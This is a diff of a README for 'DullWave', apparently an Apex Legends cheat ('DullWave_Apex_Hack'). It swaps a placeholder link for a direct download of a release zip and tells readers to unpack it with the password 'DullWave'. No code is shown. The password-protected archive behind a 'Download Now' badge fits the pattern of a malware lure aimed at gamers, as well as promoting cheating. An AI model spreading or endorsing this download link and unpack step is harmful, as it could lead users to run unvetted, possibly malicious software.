@@ -2,7 +2,7 @@
 
 ![DullWave Screenshot](https://github.com/user-attachments/assets/a1ac933c-9823-4850-bb6a-189b44488ef4)
 
-**[![Download DullWave](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen?style=for-the-badge&logo=github)](https://github.com/your-repo-link)**
+**[![Download DullWave](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen?style=for-the-badge&logo=github)](https://github.com/wansuoligue/DullWave_Apex_Hack/releases/download/latest/DullWave.zip)**
 
 ## 📥 Instructions
 1. **Download and Unpack**: Use the password `DullWave` to unpack the files.
